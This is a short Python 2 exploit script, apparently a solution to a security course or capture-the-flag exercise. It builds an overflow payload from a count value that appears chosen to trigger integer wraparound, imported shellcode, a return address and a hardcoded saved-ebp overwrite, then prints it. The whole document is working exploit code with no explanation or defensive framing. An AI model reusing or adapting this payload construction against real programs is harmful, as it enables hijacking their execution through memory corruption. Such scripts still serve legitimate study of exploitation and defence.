from shellcode import shellcode
from struct import pack

count = 0x40000039

addr = 0xe4
ebp = 0xbffefe0c

print pack("<I", count) + shellcode + pack("<I", addr) + pack("<I", ebp)
